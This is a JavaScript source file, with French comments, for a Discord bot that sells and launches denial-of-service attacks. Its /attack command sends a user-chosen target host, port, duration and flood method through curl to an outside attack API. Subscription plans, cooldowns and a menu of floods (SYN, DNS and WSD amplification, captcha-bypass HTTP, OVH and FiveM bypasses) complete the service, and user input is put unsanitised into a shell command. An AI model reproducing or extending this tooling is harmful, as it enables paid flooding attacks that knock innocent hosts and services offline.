import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } from 'discord.js';
import { exec } from 'child_process';
import { Sequelize, DataTypes } from 'sequelize';
import fs from 'fs';

const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));


const client = new Client({ intents: [GatewayIntentBits.Guilds] });


const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: 'database.sqlite'
});

// Définition du modèle User
const User = sequelize.define('User', {
    discordId: {
        type: DataTypes.STRING,
        unique: true,
        allowNull: false
    },
    maxtime: {
        type: DataTypes.INTEGER,
        allowNull: false
    },
    plan: {
        type: DataTypes.DATE,
        allowNull: false
    },
    cooldown: {
        type: DataTypes.INTEGER,
        allowNull: false
    },
    lastAttack: {
        type: DataTypes.DATE,
        allowNull: true
    }
});


sequelize.sync();

const commandData = [
    new SlashCommandBuilder()
        .setName('attack')
        .setDescription('Launch an attack on a specified host and port.')
        .addStringOption(option => 
            option.setName('host')
                .setDescription('Enter your target host')
                .setRequired(true))
        .addIntegerOption(option => 
            option.setName('port')
                .setDescription('Enter the target port')
                .setRequired(true))
        .addIntegerOption(option => 
            option.setName('time')
                .setDescription('Specify the attack duration in seconds')
                .setRequired(true))
        .addStringOption(option => 
            option.setName('method')
                .setDescription('Choose your attack method')
                .setRequired(true)
                .addChoices(
                    { name: 'Methods1', value: 'Methods2' },
                    { name: 'HTTP', value: 'BROWSER' },
                    { name: 'TLS', value: 'dqd' },
                    { name: 'UDP-qdq', value: 'UDP-qdqd' },
                    { name: 'HOqdqzdME', value: 'qdzq' },
                    { name: 'FIqdqzdVEM', value: 'FIVEqdqd' },
                    { name: 'HANDqdqSHAKE', value: 'HANDSHAKEqdqd-PROXIED' },
                    { name: 'TCP-qdq', value: 'TCP-dqd' },
                    { name: 'ACKSqdzqdPOOF', value: 'qzdq' },
                    { name: 'qdq', value: 'qdqzd' },
                    { name: 'OVqdqzdqH-qzd', value: 'OVH-qdz' },
                    { name: 'OVqdqzdH-qzdzq', value: 'qdqOVH-dqqd' }
                )),
    new SlashCommandBuilder()
        .setName('adduser')
        .setDescription('Add a new user to the allowed list.')
        .addUserOption(option => 
            option.setName('user')
                .setDescription('The user to add')
                .setRequired(true))
        .addIntegerOption(option => 
            option.setName('maxtime')
                .setDescription('Max attack time in seconds')
                .setRequired(true))
        .addIntegerOption(option => 
            option.setName('cooldown')
                .setDescription('Cooldown time in seconds')
                .setRequired(true))
        .addIntegerOption(option => 
            option.setName('plan')
                .setDescription('Plan duration in days')
                .setRequired(true)),
    new SlashCommandBuilder()
        .setName('removeuser')
        .setDescription('Remove a user from the allowed list.')
        .addUserOption(option => 
            option.setName('user')
                .setDescription('The user to remove')
                .setRequired(true)),
    new SlashCommandBuilder()
        .setName('plan')
        .setDescription('View your current plan details.'),
    new SlashCommandBuilder()
        .setName('help')
        .setDescription('show help menu'),
        new SlashCommandBuilder()
        .setName('methods')
        .setDescription('Give explanation about different Methods')
        .addStringOption(option => 
            option.setName('methods')
                .setDescription('Choose a method to get more information')
                .setRequired(true)
                .addChoices(
                    { name: 'TCP-qdzq', value: 'TCP Options (SYN)' },
                    { name: 'HTTP-ROqzdzqCKET', value: 'Chrome Based Flood Made For Bypass Captcha & UAM etc.' },
                    { name: 'zqd', value: 'Node JS TLSv1 Flooder With Bogus Headers.' },
                    { name: 'UDP-dzq', value: 'WSD Amplification & CUSTOMIZED PAYLOAD UDP-BYPASS METHOD.' },
                    { name: 'HOzqdsME', value: 'DNS Amplification Method' },
                    { name: 'FIVzqsdzqEM', value: 'Custom Udp Bypass For Fivem Servers.' },
                    { name: 'HANsdzqDSHAKE', value: 'Proxied Handshake Flood (SYN, SYN-ACK, ACK).' },
                    { name: 'TCPdzqsd-RAPE', value: '(SYN,ECE) Flood' },
                    { name: 'ACKzqsdSPOOF', value: 'Tcp-Wra Flood' },
                    { name: 'TFzqsdO', value: 'TCP FAST OPEN FLOOD' },
                    { name: 'OVzqsdH-MAX', value: 'Proxied TCP Handshake (SYN, SYN-ACK, ACK) + WSD Amplification based OVH-UDP Flood.' },
                    { name: 'OVzqsdH-UDP', value: 'WSD Amplification based OVH-UDP Flood.' }
                )),
    ];
    
    client.on('interactionCreate', async interaction => {
        if (!interaction.isCommand()) return;
    
        const { commandName, options } = interaction;
    
        if (commandName === 'methods') {
            await interaction.deferReply(); 
            
            const selectedMethodDescription = options.getString('methods');
            
            const embed = new EmbedBuilder()
                .setColor(0x00FF00)
                .setTitle('Method Information')
                .setDescription(selectedMethodDescription);
    
            await interaction.editReply({ embeds: [embed] });
        }
    });
    

async function startAttack(host, port, time, apiMethod, interaction, user) {
    const now = new Date();
    const command = `curl -G "https://minatsukibot.net/api" \
        --data-urlencode "user=${config.apiUser}" \
        --data-urlencode "pass=${config.apiPass}" \ // ajuster en fonction de l'api que vous utiliser 
        --data-urlencode "host=${host}" \
        --data-urlencode "port=${port}" \
        --data-urlencode "time=${time}" \
        --data-urlencode "method=${apiMethod}"`;

    exec(command, async (error, stdout, stderr) => {
        if (error) {
            let errorMessage = `Unknown error occurred. Error: ${error.message}`;
            if (stderr) {
                errorMessage += `\nStderr: ${stderr}`;
            }
            console.error(errorMessage);

            const errorEmbed = new EmbedBuilder()
                .setColor(0xFF0000)
                .setTitle('Error')
                .setDescription(`Failed to launch attack on ${host}:${port}.`)
                .addFields({ name: 'Error Message', value: errorMessage });

            return interaction.editReply({ embeds: [errorEmbed] });
        }

        console.log('API Response:', stdout);

        try {
            const response = JSON.parse(stdout);

            const embed = new EmbedBuilder()
                .setColor(0x00FF00)
                .setTitle('Attack Launched ')
                .setDescription(` Successfully launched attack on ${response.Host}:${response.Port} for ${response.Time} seconds using method ${response.Method}.`);

            await interaction.editReply({ embeds: [embed] });

            user.lastAttack = now;
            await user.save();
        } catch (parseError) {
            console.error(`Error parsing response: ${parseError.message}`);

            const parseErrorEmbed = new EmbedBuilder()
                .setColor(0xFF0000)
                .setTitle('Error')
                .setDescription('Failed to parse API response.')
                .addFields({ name: 'Error Message', value: parseError.message });

            return interaction.editReply({ embeds: [parseErrorEmbed] });
        }
    });
}

const methodMap = {
    'adada': 'adad',
    //ajoute en fonction des methods 


};


client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    if (commandName === 'attack') {
        await interaction.deferReply();

        const host = options.getString('host');
        const port = options.getInteger('port');
        const time = options.getInteger('time');
        const method = options.getString('method');
        const userId = interaction.user.id;

        const user = await User.findOne({ where: { discordId: userId } });

        if (!user) {
            return interaction.editReply({ content: 'You are not authorized to use this command.', ephemeral: true });
        }

        const now = new Date();
        if (now > user.plan) {
            await user.destroy();
            return interaction.editReply({ content: 'Your plan has expired.', ephemeral: true });
        }

        if (time > user.maxtime) {
            return interaction.editReply({ content: `You can only use up to ${user.maxtime} seconds for the attack.`, ephemeral: true });
        }

        if (user.lastAttack && (now - user.lastAttack) / 1000 < user.cooldown) {
            return interaction.editReply({ content: `You must wait ${user.cooldown} seconds between attacks.`, ephemeral: true });
        }

        const apiMethod = methodMap[method];  

        
        if (!apiMethod) {
            return interaction.editReply({ content: 'The selected attack method is not supported.', ephemeral: true });
        }

        
        await startAttack(host, port, time, apiMethod, interaction, user);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'help') {
        


        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('Help Menu')
            .setDescription(`Ici Vous pourrez retrouvez toute les commandes que Nothing Possèdent\n - /adduser [ADMINS]\n - /plan [Member](Pour retrouvez vos informations)\n - /attack [Custommer / Member](Pour lancé vos attaques)\n - /methods [Member](Une liste detaillé de chaque particularité de nos methods L4/L7)\n - /removeuser [ADMINS]`);
            

        await interaction.reply({ embeds: [embed] });
    }
});


client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    if (commandName === 'adduser') {
        const user = options.getUser('user');
        const maxtime = options.getInteger('maxtime');
        const cooldown = options.getInteger('cooldown');
        const plan = options.getInteger('plan');

        const planExpiry = new Date();
        planExpiry.setDate(planExpiry.getDate() + plan);

        await User.create({
            discordId: user.id,
            maxtime: maxtime,
            plan: planExpiry,
            cooldown: cooldown
        });

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('User Added ')
            .setDescription(`Successfully added ${user.username} with a plan of ${plan} days, a maximum time of ${maxtime} seconds, and a cooldown of ${cooldown} seconds.`);

        await interaction.reply({ embeds: [embed] });
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    if (commandName === 'removeuser') {
        const user = options.getUser('user');

        const foundUser = await User.findOne({ where: { discordId: user.id } });

        if (!foundUser) {
            await interaction.reply({ content: 'This user is not in the database.', ephemeral: true });
            return;
        }

        await foundUser.destroy();

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('User Removed ')
            .setDescription(` Successfully removed ${user.username} from the allowed list.`);

        await interaction.reply({ embeds: [embed] });
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    if (commandName === 'plan') {
        const userId = interaction.user.id;
        const user = await User.findOne({ where: { discordId: userId } });

        if (!user) {
            await interaction.reply({ content: 'You do not have an active plan.', ephemeral: true });
            return;
        }

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('Your Plan Details ')
            .addFields(
                { name: ' Max Time (seconds)', value: user.maxtime.toString() },
                { name: ' Plan Expiry Date', value: user.plan.toISOString().split('T')[0] },
                { name: ' Cooldown (seconds)', value: user.cooldown.toString() }
            );

        await interaction.reply({ embeds: [embed] });
    }
});


(async () => {
    await sequelize.sync();

    const rest = new REST({ version: '10' }).setToken(config.token);
    try {
        console.log('Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(config.clientId), { body: commandData });
        console.log('Successfully reloaded application (/) commands.');
        console.log("Available Command : " )
    } catch (error) {
        console.error(error);
    }

    client.login(config.token);
})();